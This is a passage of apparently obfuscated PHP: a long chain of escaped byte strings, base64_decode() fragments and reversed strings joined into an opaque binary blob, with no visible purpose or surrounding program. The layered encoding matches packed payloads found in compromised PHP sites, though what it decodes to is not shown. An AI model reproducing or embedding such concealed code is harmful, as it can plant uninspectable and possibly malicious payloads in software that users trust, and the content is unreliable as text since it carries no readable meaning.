\x2a\xd8\xa5\xa5\x84"."\203\105\261\362\340\327\162\357\77\341\342\45\360\74\201\34\366\70\311\23\364\132\163\142\167\1\355\345\222\234\113\202\24\14\137\161\232\313\53\245\70\261\35\57\221\210"."\x8a\x59\x80\x51\x6f\x1\x46\x45\x35\xa1\xd\xed\x2d\x6c\xbe\xb1\xb9\xb7\x84\xef\xd\xe1\x6e\xc9\x6\x9d\x28\x12\x8b\xa6\xa\xc6\xe2\xd9\xa2\x79\x35\x30\xc\x30\x39\x38\x3f\xf8\x60\x29"."\275\312\20\257\11\220\40\226\100\147\20\306\263\111\54\221\206\374\70\224\141\356\16\217\63\153\164\123\362\106\374\7\264\55\146\143\240\270\54\321\235\237\171\201\200\67"."\xa0\x7c\xd1\xa6\x56\x8c\xe5\x11\x1\xcd\x93\xf1\x49\x16\x44\xe5\xe0\x94\x2c\x28\xc2\x4\xa\x92\xf\x2f\x17\x48\x10\xc6\xa0\x7c\xfe\x60\x73\x28\xdc\x86\x6f\xfe\x44\x9a\x5a\x7d\x6d\x1e"."\27\41\334\30\23\160\176\310\271\110\365\122\71\244\174\70\252\334\2\176\324\20\5\131\24\265\12\326\125\314\4\74\12\206\102\276\233\164\206\314\276\204\356\203\312\250".base64_decode('SH05vl5NqmROS0LhaAwAgJBngeqWCzuEYJ8LL7D0U94+JSeAAE69B8SpbxNQOQ==')."\254\263\51\24\154\366\323\113\116\336\270\45\315\33\366\303\53\275\244\131\56\346\161\333\15\20\310\17\44\331\67\277\316\12\23\330\216\16\2\174\103\207\51\202\213\25"."\330\114\44\310\276\71\143\10\2\320\116\222\323\326\116\57\373\156\145\367\17\141\102\50\54\4\74\141\117\133\204\5\303\235\200\126\303\70\341\36\136\233\47\22\5\243"."\xa\x76\xb4\x71\x7a\x1e\xf0\x2c\x4\xa8\x10\xe2\x2c\x7\xa5\xc5\x15\xae\xaa\x86\xca\x2e\x7c\xcb\x8\x7f\xe2\x9f\x53\x69\x8\xde\xce\x58\xba\x62\x8a\x43\x9a\xb1\xaa\x92\xe4\xa1\xf7\x72".base64_decode('YmYasO0x3sppgVgg1ILDyPWLL5fkvLu0RAJMaJQzoQbdmBiuSwBDJXx1UQqGOg==')."\75\334\217\210\220\200\143\310\215\111\211\173\27\161\57\133\322\65\320\345\2\134\200\261\234\137\36\362\66\112\224\277\150\202\222\7\221\351\111\151\17\335\53\227\73\310"."\xb6\x10\xcb\x68\xdd\x8c\xc7\xb\x7a\x29\x4f\x80\x7f\x17\xd1\xf\x44\x10\x49\x1\x20\xa1\xe6\x33\x54\xd\x8d\xaf\x2f\xc5\xba\x56\x76\x4d\xee\x72\xba\xf0\x8d\x2d\xc8\x95\x74\x39\x78\x97"."\x62\xbe\x45\x60\x23\x8d\x44\x2c\xd7\xcd\x62\xc8\x33\x6\xa9\x1d\xc\x96\x7c\xe1\xa5\x89\x3\x73\xc9\xf\x11\x58\xe6\x12\x10\x90\xe0\xbc\x7a\x36\xa7\xbe\xd3\x56\x6\xc1\xdf\x96\xe8\x4a"."\37\370\33\0\77\201\50\230\65\225\145\0\353\56\340\137\340\133\11\377\341\11\225\14\220\370\312\206\265\200\77\270\22\374\13\250\310\112\177\320\136\131\243\57\332\351".base64_decode('8+EM9Jv88qyAqpChCh6C5ofobUMp4GuOSjBMuxGLVSBgOpdWV8ZibqODoA274g==')."\x5d\x51\x3e\x71\x4a\x39\xd9\x28\x3c\x91\x26\x4e\x62\x2d\x8\x51\x8c\xb\xc8\x98\xdc\x8a\x8\xcc\xe3\xd\x9\xb7\x84\x43\x1d\xed\x42\xb8\xd5\xb3\xd0\x1f\x6c\xa1\x21\x77\x15\xfd\xaa\xa2"."\x9e\x37\xbc\xfe\x8\x0\x51\x13\x45\x46\xee\x88\x47\xc\x13\xae\x12\xf1\x3e\x22\x3b\x6b\xc1\x6c\x2f\x20\xdf\x20\x20\xf0\xe2\x90\xcb\xc7\xe4\xd7\xba\xd8\x1a\x3b\xfc\x1\xaf\x78\xc3\x16".base64_decode('ZiS7BiLdZOOYRDtHw+iuLQ1AkNNvhG40gGBAAxgANITARQPI4Q8NoIHSABQ7fA==')."\101\232\6\344\72\40\223\121\141\255\233\333\30\247\345\176\166\133\154\116\62\56\134\372\206\224\330\205\365\143\320\41\0\220\11\145\246\161\264\51\16\221\176\111\220\252"."\261\371\240\44\134\132\205\32\110\101\47\344\306\71\0\263\211\362\200\337\256\345\15\210\31\136\116\121\26\137\224\64\243\252\231\261\64\112\356\126\201\106\375\350\156\232".strrev('4Õ¬åVúF¤ZKòåËì&rÒ(ÄT«Jå¢`Åï šcw+ª¹ÎÙ,Ğ')."\x13\xc6\x10\xec\x38\x1c\xff\x74\x91\x1a\xa8\xce\xa0\x8c\x6c\xba\xe\xb2\xed\xfa\x43\xb1\x0\xd8\x4c\x62\xa2\x24\xe9\xf\x11\x45\x83\x2b\x2e\xde\x59\x8e\xf1\xab\xcf\x2e\x99\x1b\x48\x9a"."\x7a\x41\x70\x27\x84\x8c\x25\xc1\xe4\x7a\xf8\xd\x47\xa6\xfb\x40\x69\x85\x38\xcc\x2c\x40\x53\xd5\xea\xa0\x16\xd\xc6\xe2\xf5\x4a\x58\x2a\x18\x49\x6f\x3a\x63\x37\x4b\x76\x4b\x46\x31\x9a".base64_decode('G0MytR+1wVTBRFgKiHplOSlYPkq0ZaSPzFl9AQFEycTgrWDABsUU3v+sYhjsaA==').strrev('5$²£{ÃŠ‘KÌÎ€Ã~R3#èÚzFg!U…#o#Ë¢™+óLÓô±'."\0".'')."\371\331\300\205\134\74\62\300\235\33\101\235\26\257\163\51\145\135\371\40\207\325\274\135\303\225\323\332\25\75\253\42\145\135\47\267\24\147\351\102\151\144\220\257\375\24"."\160\13\71\320\102\73\233\131\47\75\343\144\56\355\20\302\110\214\201\143\346\317\140\112\121\131\301\142\27\321\22\122\255\116\24\374\23\154\235\63\65\255\115\316\15\105"."\265\205\252\102\320\324\33\352\14\6\102\324\147\13\165\350\104\10\31\71\37\3\102\220\356\242\1\223\176\350\62\151\271\223\156\164\160\261\12\156\376\46\210\70\200\46"."\x93\xe3\xa4\x27\xdc\xd4\xa\x58\xd4\x58\xb3\x1f\x70\xe6\xbe\x45\x51\x5e\x41\x2b\x28\xa\x98\x5e\x61\x9a\x84\xd8\x36\xea\xc8\x0\x50\x5c\x48\xda\x2\x5a\x37\x5b\xbc\x80\x74\x11\x7\x1e".strrev('ó8V7¿ã1#¨5‘’&¹d³k(ÖÁ¡{ş*®Ä3xgûcºZ.²‘ì–').base64_decode('DYqhiwX/tRD3yoZaQoUEumUrgxAIG2qTuU6TZO55ABBLIFW0gp02FF5Mhm9ELQ==')."\364\17\353\17\335\350\136\22\341\33\346\40\165\270\23\1\207\360\42\53\0\321\143\137\364\314\215\170\302\340\212\161\17\376\131\234\115\72\101\127\311\131\132\122\61\231"."\7\2\270\256\74\202\177\4\341\126\127\226\221\244\1\301\111\220\334\257\300\233\3\224\71\57\72\245\44\103\346\303\241\100\140\36\0\254\307\130\20\41\371\11\312\202"."\220\67\26\11\165\204\251\146\17\206\321\75\261\260\257\151\61\123\270\261\330\146\317\102\173\14\134\3\121\117\113\311\150\46\125\301\170\304\267\304\302\41\50\134\372\2"."\315\266\2\221\126\346\275\311\32\27\13\370\203\13\112\46\104\103\261\66\241\10\216\364\107\175\155\366\70\153\15\21\37\134\277\74\334\30\10\65\11\311\376\120\61\44"."\0\263\144\213\304\62\52\216\4\314\166\327\12\304\241\324\1\106\45\271\22\262\267\316\30\340\216\33\272\126\125\126\164\271\33\134\125\114\70\303\364\104\270\351\64\112"."\xb4\x41\xe9\x7e\x9d\x3d\x2\x6e\x19\x34\x12\x17\x23\x21\xb7\xcb\x45\x1a\x61\x1f\x40\x7c\x64\x4e\x30\x28\x19\x25\x2e\xf3\x22\xd8\x5d\x80\xa5\x17\xb6\x3b\xbb\xf4\xfa\xa0\xcb\xee\x61\xca"."\x8f\xf5\xeb\xb1\xc8\xe2\x8\x83\x36\x46\xcc\x52\xe9\x16\xfc\xc2\xd9\xc4\x43\x2f\x5b\x66\xf0\xb7\x5d\xcc\xa\x4f\x65\x4b\x66\xb4\x20\xa8\xe5\xbe\x98\x18\xe5\x52\x35\xbe\x32\xf8\x12\x4e"."\152\211\2\364\110\300\41\316\267\31\20\345\342\133\54\135\205\114\217\100\66\31\247\350\134\20\302\124\344\26\222\161\333\216\101\42\370\171\232\260\257\360\310\132\152\213".base64_decode('sNiZdSa7oi3QR1LX6ayDqi44KQJ8ZVIVLinKCcoYFBK91AIJETDDOaBSEExk/g==')."\14\310\151\160\114\106\256\73\142\242\71\102\237\323\120\273\163\116\71\323\255\1\46\201\232\6\365\71\251\361\21\111\347\16\263\362\132\106\245\176\113\372\234\240\11\41".strrev('¸Mn5ûüFšN¢'."\r".'ZÌ‘d46­Ç$!QÙ(DÄHX01³˜vÂS•g'."\r".'').strrev('ŠıÂ‰²ÂUqÙ{fÏ—¶F‰DA¸H	@ŒÍ-*T¡oq!Ğpí.G¿pªëñ¶=Cp').strrev('í‚0Z–¯¤äÓÍµ³šdgOSw¢£»Á±ÄWFà‡}÷&}=ãZA9®$Ÿat‡').base64_decode('qCsK9iOKS/KAMY3yxTimeoaUBsAnSFLsS2yi1YcejsSusIC8loTHepTjwbE25A==')."\301\221\234\207\307\141\354\142\205\236\226\247\145\326\141\70\14\374\125\252\335\105\45\333\135\124\252\335\105\266\166\27\25\267\213\243\154\110\52\347\363\115\330\147\247\110".base64_decode('TSxRCTFAKW4KHlqKh59EMsW2SC6Q7MXMX5LlN/gXWwgpYYlYqnMR0pSkBN6gBA==')."\x3e\x23\x1b\x26\xe4\x8c\xff\x2f\x3c\xde\xc1\x5b\xea\x6d\x8c\x5d\xd7\x29\x2a\xbb\x35\xc3\x70\x43\xef\x3e\x88\xb3\x64\xa7\xec\xa1\x8\xd5\xca\x59\xc7\x84\x5d\x61\xb\xd2\x21\x71\x3d\xc2"."\234\257\61\327\154\334\177\33\126\246\340\157\37\273\206\16\30\144\117\267\22\121\40\151\43\120\361\15\346\65\103\21\135\11\46\25\344\155\212\135\67\24\374\356\145\345".strrev('-QÃìègmxLË0$ ©zQC:Ç›t0Nƒ ³9€@ı]§:àñ¨|HA').base64_decode('DgA4RdSZB0OsdneWjHAKV3kxXRA8WoIekkZgh8lKTiMoUdEX/5xeavxOnbsNBA==')."\263\212\175\315\56\120\206\250\3\76\333\132\260\371\354\353\152\351\152\353\212\212\0\63\165\71\225\2\335\26\334\200\131\372\362\123\136\5\211\106\151\162\111\77\202\44"."\x11\x71\xc6\x6e\x1d\xb1\xad\x8e\x81\x18\xc3\x53\xe4\x66\xba\x4\xa6\x9e\x6\xe3\x9\xae\xa6\x38\xaf\x9b\x2f\x8\xfe\xce\x45\xec\x80\xfb\x34\xf3\x4e\xd\x45\x5d\xec\xcc\x91\x12\x8\xe4"."\x64\x91\x38\x65\x65\x5e\xf\x1\x78\x72\x8d\x1a\x35\x25\x5f\x51\x6\xf0\xae\xac\xae\x6c\x62\x5\xf8\xad\x2c\x73\x94\x41\x96\x9\x85\xe1\x4c\xc1\x8\xd4\x8f\xb2\xba\x89\x15\xe8\xa3\x92"."\xdc\x69\x1f\x26\xe6\x9d\x82\x57\x33\x7e\x98\x41\x84\xdc\x6\xd9\x34\x5\xdd\x5b\x3\x82\x6\x5c\xe9\xb5\xee\x5a\xf7\x0\x59\xfd\xd\x7d\xb0\x45\xee\x55\xd9\x4e\xf1\x7\x63\x80\xc8\x51"."\x5d\x54\x4c\x24\xb5\x84\x88\x13\xa8\x8b\x29\xad\xac\x27\x94\x8\xb7\x79\xa7\x53\x9a\xe9\x69\x3b\xdd\xc9\xfd\xc\xce\x6d\x18\xcc\x66\x24\x22\xd\xd5\x97\x4f\x71\xd5\x94\x4b\xd4\x29\x77".strrev('µ‡•”šÊÑ¡­¸›:¢<ébÄpúV ÚTŞR›s!Şa¼«9Ù´Gy}').base64_decode('2NgAPcq6EgSYHYxmcdePOcUc0HRy4kDIaW3NNBFvCYoYZI3hq/Z1UGtGh9+RHw==').base64_decode('KuScUDh2RkR/NzZXszXW/FC8teYXCWGCk4gs/8Sugesk0V+04FjPCTkAvPKopg==')."\x85\xc4\x41\x1a\x49\xa3\x54\xd1\x4d\x21\xc5\x6b\x48\x0\x63\x56\x2\x78\xaa\xad\xbf\x10\xd4\x4e\xc0\x55\x41\xfc\x7\x8b\xa\x6c\xb6\xa6\x52\x2a\x8b\xd5\x29\xb1\xdd\x55\xb1\x1d\xa\xa8"."\x8\x9c\x5c\xa7\xe8\x3\x79\x10\xb0\xd4\x30\x19\x7a\x4f\x75\xc2\xf9\x75\xaa\xc9\xd1\x52\xf8\xa2\x2e\xd9\xd5\x4\x41\x95\x52\x59\x3a\xa\x6a\xd2\xde\x24\x3a\xe4\x71\x16\xa\xb4\xc1\x92".base64_decode('lYoMP82ABuFn9VlYbyC4Oxm3befeBW1msf9RsHil2ql102eDP4Q80jOqQt6sZw==')."\237\324\77\351\4\167\212\322\1\356\301\230\216\15\116\270\305\51\253\20\315\301\310\126\70\45\40\226\174\274\267\26\377\327\144\240\130\222\24\134\321\42\265\53\136\111".base64_decode('8NA2xlz7lqCkSaWf7pZksxSsDtmEdNMPneWX+RKJZ3r5SOLQLI5geC/oqMaZKg==').base64_decode('tK0KOs5EupDrrRcSJVPTpKycGyLs/iSjbpIxBzZUP8k1LWWAAKHXzEMb3Ee4pw==')."\43\354\52\201\244\140\45\263\13\372\315\166\301\115\52\134\40\271\332\63\5\346\63\71\217\276\111\17\333\3\35\55\376\240\160\316\54\104\304\232\274\301\230\247\275\275"."\144\2\143\117\240\42\13\36\311\270\172\350\263\0\11\212\125\163\325\154\267\224\200\6\246\365\145\60\266\114\62\364\4\365\123\127\346\46\164\24\145\340\2\322\134\225"."\24\51\207\105\244\24\100\23\47\372\302\311\345\363\346\272\325\171\14\330\334\13\204\256\161\373\131\227\373\24\50\56\271\341\21\156\156\62\234\135\361\30\11\305\66\163"."\237\17\222\64\127\226\60\34\353\313\341\371\132\252\134\112\203\375\230\31\251\314\263\27\16\322\123\213\271\156\131\114\204\53\53\254\121\146\227\211\114\375\114\175\134\122".base64_decode('L+5J2JwdN8m5hcVFYOWuhJiEZxJZ+BbndyNR382lQ4szJuupAVO0l8AQF3tmIA==').strrev('»ÇV«ÿn®b¾Cw:§Jh©ÂšõüX\'éC´$€t€½ñz!z\'/')."\173\222\47\257\332\243\40\32\331\343\240\200\315\343\300\246\146\155\6\243\260\230\211\307\320\74\201\140\13\57\200\245\17\36\6\211\113\250\111\33\12\165\55\51\167\125".base64_decode('rVrlVulBdVeZtayL5cbhLpc1P+g5ATXLSCLsOTHzOJ+svEPcVdyYnx1IS/CUug==').base64_decode('vn7eEnbUsJSmUQ5QnTKLTvdw2hntZJ9NQc7jMgzHxMSFlCEeq7+8hn7mHlu0kQ==')."\305\337\236\174\136\14\122\57\361\110\11\236\121\343\156\266\324\261\142\334\225\340\126\355\64\13\42\64\266\170\170\232\154\113\200\6\350\50\272\37\120\102\300\162\365\330"."\343\101\135\54\222\175\314\65\22\272\232\67\55\104\12\77\207\123\206\34\232\367\310\375\62\316\122\46\321\347\65\312\220\373\326\62\100\224\160\12\241\6\274\53\163\41"."\xf5\x91\x74\x25\x53\x5f\x86\xba\x6b\xa4\x15\x5\x94\x47\xf4\xa5\x54\x23\xa0\x60\x99\x44\x49\x63\x56\x66\x10\xd3\x4d\xd\xec\x7a\xcc\x54\x9a\x3c\x25\xd0\x11\x26\xc6\xa8\x9e\x20\x39\x6a"."\x20\xfc\xd4\x29\xcb\xf0\xef\xc4\x53\x28\xa2\xa0\xb7\x2b\x32\x8a\x8e\x2d\xee\x10\xc9\x41\x87\x4f\x29\xae\xb1\x22\x2f\x1b\xb4\x87\x43\xd1\x50\x13\x75\xe\x5f\x4a\xb5\x35\x8d\x32\xaf\x6"."\66\303\347\102\16\265\206\136\340\133\154\315\301\330\1\67\211\41\323\257\27\162\71\166\346\17\371\103\266\147\341\243\233\110\272\140\362\335\16\172\167\215\302\373\103\6"."\211\26\334\61\101\147\120\112\322\145\11\224\310\206\317\334\141\45\164\15\130\324\23\270\372\214\106\235\120\325\326\324\324\70\153\246\200\77\354\124\221\60\130\165\65\65"."\x45\x59\x6a\x6a\xea\xd0\x1f\x9c\x80\x94\xaa\x4\x8a\xd6\x14\xb0\x68\x29\x75\x21\x19\x6\x80\xd0\x4f\xbe\x48\x16\x35\x57\xa0\x3c\x50\x13\x34\x4a\x97\x60\xcf\xea\xeb\xeb\xe9\xbe\x4f\x7"."\0\40\210\356\74\325\321\245\77\107\220\335\346\110\350\334\212\204\24\73\30\330\201\40\231\24\272\75\300\265\116\277\1\63\2\46\10\201\205\364\230\135\112\0\331\370".strrev(''."\0".']†P£ùY‹ÕtúFu‚d[äid°x¤b¼\\ÆÅêO·ÁÌe"Irø~ƒÔ').base64_decode('hMEgy4odQuObJmS0JbAnrQ3E+M4Gg/NZCA0eSiMUZdgwCQQozaMoQg+eyTk2ug==')."\xf2\xd6\xab\x66\x2c\x97\x90\x62\x42\xdd\xa2\x37\xe3\x39\x30\x23\xed\x3b\xa0\x33\x90\x81\xa5\x93\x89\x75\xe6\xa4\x35\xc8\xfb\xb8\x38\x1e\x20\x37\x8c\xe8\x89\x1d\x6c\xfd\x52\x77\x88\x0"."\111\135\343\227\204\212\336\243\242\41\341\352\34\325\37\107\376\213\41\5\215\361\321\10\154\172\320\304\334\120\11\25\330\223\154\145\74\111\341\251\44\203\373\237\152\142".base64_decode('ruZEp1T4qFY40DeIE1R+Nkvr6BeEBFde17oB/A1xrCC+vXQ0y16cs0QmNiAxnw==')."\x18\x9\x6d\x88\xe8\xab\x3d\x4\x95\xf8\x95\x1f\x99\xbf\x27\x26\x64\xe5\xd7\x53\x84\x48\xab\x3d\x8f\x90\xd0\xc4\x3c\xc7\x8b\x91\x50\xe8\x10\x4f\xe3\x91\x99\x90\xb5\xe\x28\xcd\x58\x63"."\130\317\176\2\127\250\24\152\222\27\236\204\353\132\44\33\67\152\202\32\2\121\153\251\152\364\240\37\102\203\37\272\131\343\213\260\214\54\5\112\6\361\302\261\246\375"."\363\202\313\351\307\172\232\13\16\236\51\243\104\235\54\34\170\114\24\264\341\162\151\145\257\21\225\100\27\53\112\24\315\75\322\330\302\12\352\30\261\20\102\100\312\240"."\274\110\222\366\267\257\240\120\376\111\240\54\222\311\351\12\354\23\64\231\115\353\232\151\212\227\137\75\111\201\34\6\304\335\63\212\213\70\347\361\166\54\107\70\202\217"."\x47\x96\x15\x50\x70\xda\xba\x4c\x49\x37\xb2\x9b\x71\x21\xdf\xb3\x9c\xbd\xb7\x5\xed\xb6\x35\x88\x54\x9b\x94\x18\x53\xe7\x98\x39\xf6\x62\x0\x9c\xce\x88\x60\xe8\x50\xa2\x5\x52\x88\x15"."\x21\x3b\x88\xae\x24\x34\x1d\x9\x7d\x1c\xb1\x12\x39\x33\xac\x74\x8b\xc1\x80\xc6\x84\x5d\x78\x64\xa0\x94\xa8\x2\x5e\xd5\x16\x90\x13\x62\x1\x10\xc3\xa\xe2\xc5\x6f\xc1\xb7\x26\x8\x9".base64_decode('nlCFbd05RWL8QAzXjAPVQgLKX4o1sKlcBBtHJGVGCnGm3bZt19SCUhK3TGoHCQ==')."\x2b\x40\x97\x85\xe1\x8\xc\x31\xd\x54\xb\xbd\xf9\xf1\x91\x89\x45\x50\x9b\x45\x45\x70\x1a\xdc\xe6\xb8\xc1\xa4\x98\x62\x0\xc9\x4\x82\x6a\xf4\x94\x12\x4d\xa1\x24\x1\xa2\x9\x76\x9f"."\x9f\x40\x87\x3\x89\x24\xc\x29\xd4\x7c\xca\x39\xa5\xd6\x39\x95\x28\x56\x45\x5b\x4a\xb2\x35\x12\xf8\x42\x4e\x52\x40\x3\xc8\xef\x52\xa\x46\x6c\xa1\x48\x3e\x9e\x47\x13\x5e\x25\x42\x17".base64_decode('a/kdQnSHmM0numzMQrqw4yjMTgrduhXJCj/HxeZTMENHqXQMIZjstViX2TKAlQ==').base64_decode('YU0nTlKzllcmAR5YTBRslRD3uKIjWFSKj4Mb6oEoDbtiFQDDz6PxfWRqYcjoEg==').base64_decode('j45qLLL4TNvFLCzJ7RLy/E9FJbxdYtEmtA2xWwJgJnvh/sjM3AwxQFMZchqWAA==')."\x36\xb\xb1\x94\x66\x51\x2c\xd7\x80\x12\x27\x64\x9e\x4a\xc1\xed\xad\xed\x6e\x16\xd5\x48\xc1\xc4\xee\x7b\x12\x11\x8a\x3f\x28\x43\xcc\xa7\xc8\x4d\x8d\x1\x0\x77\x6d\x80\x2c\xb0\xa6\x3a"."\x66\x29\x43\x5f\xad\x1c\xc8\xaa\x9\x29\x10\x6a\xf1\x37\x79\x2\x5e\x7f\x64\x81\x4\x1d\x10\xf0\xd3\x7a\x64\x2a\x6d\x5d\xee\x48\x2b\x84\x27\x87\x62\x7e\x9c\xf9\xfe\x85\x9f\xce\x38\x60"."\xb\x9d\x49\xc6\x1b\x1b\x9c\xb\x16\xc\x68\x4\xf\xf8\xd6\x6a\x31\x8e\x2a\x7a\x51\x8d\x80\xa7\xce\x5a\x9\x2\x2a\x3\x75\x5d\x25\x72\x67\xb8\xb6\x47\xc8\x9c\xd7\x95\xe2\xfc\x43\xa"."\x7a\x7a\x92\xf7\x58\x28\x50\x28\xd1\x1b\x92\xbf\x74\xb\x60\x89\x58\x73\x83\xcd\x5a\xc9\x8d\xd6\x79\x35\xd7\xaf\x1a\x2a\x27\xe\xb4\xc4\x90\x58\x3b\xd7\xe6\xe9\xcc\x55\xb5\x0\xf4\xa4"."\xe8\x8d\x9a\x3\x1b\xb7\x52\xec\xd\x83\xf8\x39\x10\x5d\xaf\xda\x4\x54\x3c\x4d\xa2\xdb\x94\x3c\xd5\x4d\x93\x77\x54\xb8\x9f\x70\x14\x14\x3c\xb8\xe7\x75\x59\x35\x14\x21\x2\xbb\x12\xaf"."\252\244\41\301\227\12\51\35\303\145\160\134\30\76\305\370\277\256\134\115\162\167\12\266\256\251\111\172\242\315\354\341\261\333\336\46\361\51\30\332\205\42\67\363\377\325".strrev('(]Qñrz'."\r".'©S‰I;ˆyâò‡Òl@x¾Ãv³’ÑïDEµ9Òècã«ƒ½a')."\14\160\376\24\146\47\265\301\346\260\204\2\344\45\170\60\100\71\131\252\230\0\13\232\200\335\162\36\150\163\275\157\67\200\263\274\277\130\324\6\64\111\32\275\36\120"."\116\342\62\73\313\40\325\113\65\110\31\304\137\143\220\346\322\253\71\274\11\344\63\301\227\315\233\26\41\214\130\305\362\314\226\167\63\21\367\301\45\27\150\136\241\145"."\207\212\42\54\362\175\200\366\213\231\140\101\27\320\271\224\46\202\1\21\100\260\217\340\147\105\240\131\62\376\302\142\237\3\60\342\212\131\354\177\36\327\63\152\245\206"."\175\13\341\354\14\40\12\221\264\66\140\175\51\4\306\10\314\213\205\50\133\333\202\51\2\62\243\13\232\302\165\27\372\13\257\375\133\34\377\13\265\117\302\77\135\344"."\227\122\171\173\325\170\135\223\256\124\262\271\157\262\274\7\55\104\264\51\134\22\103\245\340\131\267\234\143\144\213\170\336\147\57\202\360\345\105\323\4\224\102\157\117\170"."\107\51\152\213\226\254\36\301\271\243\165\276\3\131\235\143\263\323\55\146\371\204\54\320\104\127\347\121\55\52\167\73\60\357\3\51\20\17\65\16\211\337\242\261\37\32".strrev('fäºE‹“c	œ¸´gwKq~°‰zşÈtÀ–^ÒGxúBy€Ã$‘:¤H4')."\20\147\311\206\243\334\162\76\77\252\2\236\360\43\130\31\137\310\371\361\375\47\113\254\56\310\105\242\271\45\76\166\340\227\74\110\166\320\132\73\76\147\40\303\26\253"."\xa4\x67\x3d\xe8\x7\x4a\x4e\xcd\xc2\xf3\x83\xee\xe2\xb3\x21\x68\xd2\x43\xd9\x1b\xc1\xf6\x8d\x9c\xd9\xb9\x44\xc1\x85\x64\x90\xe6\x4a\x7c\x82\x2d\xb\x14\x22\x4\x5c\xf5\xe8\x3\xad\x7a"."\221\321\375\211\130\206\207\326\367\155\60\302\242\37\257\222\142\134\77\14\13\256\160\204\13\240\374\200\330\376\246\6\155\206\75\20\342\300\43\343\257\33\341\347\100\34"."\354\351\17\7\166\306\343\40\17\176\70\370\145\235\237\172\42\207\277\52\146\175\212\14\366\231\31\213\25\261\337\166\316\233\201\312\126\40\154\7\134\124\53\326\244\361"."\23\261\134\41\313\17\34\101\300\52\211\24\15\130\30\141\101\317\70\320\171\240\203\372\73\261\201\203\217\112\234\231\22\60\374\357\165\140\233\101\44\136\44\255\124\247".strrev('O“ã=Xÿ¢ìü?>xÅÏ§Sµ“gç¢¨k±ÖÏP€ëªlö,g§\\nn')."\274\144\105\53\211\272\245\22\227\57\112\264\132\165\26\77\320\43\240\250\225\44\377\357\226\2\147\212\161\126\301\332\262\370\335\256\42\220\40\254\24\54\23\204\15\315"."\x76\xf2\xac\xc1\x3\x61\x83\x77\x16\x6f\x61\xfc\x81\x1e\x6b\x5b\xf8\x39\xa9\x12\xe3\x10\x36\x22\xbe\x34\xf0\x13\x30\x5a\x6\x8a\x97\x59\xa8\xdc\x34\x75\xd9\x2a\x27\x95\x12\x7\x10\x24"."\xa8\xec\xa1\xa2\x37\xf3\x14\x7b\xdf\x11\x60\x88\x22\x81\x27\xb\xf2\x82\x58\xa3\xa9\xd9\xb5\x20\xb0\x38\xdc\xa8\x90\x12\x2e\x94\xcb\x90\x6d\x17\xde\x4a\xe4\x8b\xec\xff\x6e\x2\xa9\x48"."\x80\xa5\x7\x6e\x84\x50\x62\xe4\xee\x53\x29\x21\xb1\xbd\x9d\x63\x7b\xfc\xec\x27\xfa\x8d\x99\x2e\x26\xfe\x38\x65\xfa\x1e\xf\x9a\x54\x41\x73\xa6\x98\x21\x34\xc1\x84\x7b\xe1\xd2\x98\x75".base64_decode('rLbqQTFex1KHNFqmYi5MeCuIO28QWC5Yml6GGkWYpdSKP4OCLrBwZTRaq5Z1Kw==')."\270\175\23\357\203\240\212\304\145\120\134\65\322\217\220\376\222\205\213\236\262\107\306\32\236\26\166\15\110\26\154\104\40\350\204\367\257\64\361\333\172\307\66\104\335\143"."\1\46\311\42\150\201\260\327\366\104\32\42\76\366\167\323\350\370\321\72\347\64\115\270\135\146\21\7\330\173\41\26\361\300\260\77\234\3\330\51\321\333\35\10\62\14"."\47\233\47\241\172\310\374\26\267\346\260\277\232\227\27\256\323\332\336\363\24\124\225\326\227\72\323\142\267\240\233\1\333\262\246\227\371\340\335\110\174\176\102\10\77\162"."\x3e\x86\xbf\x29\x27\xfe\xff\xfc\x8a\xde\xff\xaf\xc7\xf3\xa6\xd7\x50\xa5\xb2\xe5\x85\xb5\x16\xc2\xe0\x52\x6e\x6c\x58\xf0\x75\x88\x15\x9a\xb6\x71\x58\xb7\xc8\x31\x62\x2a\xc1\x50\x87\x25"."\104\2\174\301\301\275\307\145\173\264\324\305\354\21\251\133\12\352\255\102\246\7\46\62\174\72\250\110\101\111\237\334\2\30\331\313\136\204\52\25\50\176\10\321\202\174"."\224\337\344\335\314\251\211\336\22\7\160\160\12\2\126\177\174\2\227\120\224\215\323\47\300\114\120\107\34\156\372\225\200\142\26\144\45\51\131\24\157\213\205\362\124\40"."\253\44\224\170\351\251\224\174\240\373\247\204\212\210\224\303\22\125\104\157\242\226\135\320\22\51\202\207\277\36\352\262\276\137\111\112\264\331\36\74\302\231\14\21\266\26"."\155\162\361\171\154\161\151\266\230\305\42\320\76\323\252\223\141\217\46\326\330\137\121\234\342\54\156\14\233\107\103\175\102\30\112\374\24\41\321\201\3\72\20\54\121\6".strrev('?â¸¦Ì\\z+ğ^†°CV™cYŠÄ5×nbéxâ_AKÉì„^—ú'."\n".'3ÏË/')."\xc9\x52\x35\xe4\xf9\x93\xc\x3b\xd2\xd1\x56\x81\x2c\xfc\x9\xa6\x2\xee\x5e\x78\x9e\xd7\xcc\xe6\xb1\xb6\x4b\xdc\x43\xe9\x45\x1a\xc1\x32\x95\x44\x59\x74\x52\x86\xe8\xcf\xd8\x5a\x12\xda".base64_decode('GltXyrxS2RKabgjZWHypvPD9NtMCTe6O1e6GFYnCWLq1CLnk2FCMEk7VAHubtA==')."\72\127\106\211\50\232\72\167\242\157\66\363\163\41\353\261\34\363\70\131\104\251\12\152\100\110\106\245\250\173\20\360\13\57\24\371\371\175\153\224\214\265\331\236\176\331".base64_decode('pIdb9lIdFllCOMRLINzxFZ/T8OMjYfOnxaAwwmmtLV4g/pzayf38aIZzv8kkew==').base64_decode('i9OSNUn5fxYLYviznZDXEe4ocmNYZcD+SpxLvNdoyVgcy+8wCuW5lp4PE8aVGg==').base64_decode('Ploy1uLiHUmGVDwKe+ZlhimCpAGNurnFCh4Kk6N5k9YbmSwbmzOQB5nQOy2xNg==')."\331\11\152\45\350\66\156\113\62\304\147\106\255\147\163\242\140\57\240\200\222\11\10\325\211\347\166\243\26\210\224\156\204\143\245\25\304\302\355\125\236\100\67\53\315\2"."\x7c\x81\xd8\xb1\x81\x91\x9c\x61\x31\xd1\xd2\x1d\xfb\xd4\x22\xb6\x9f\xa3\x2f\x8e\xcc\x22\xc5\xa7\x8b\x2a\x92\x8b\xf3\x2b\xb6\xde\x8b\x5\xec\x23\xc3\x25\x8c\x1\xd5\x4c\xa4\x5\x59\xa4".strrev('–'."\0".'€£²–ñ›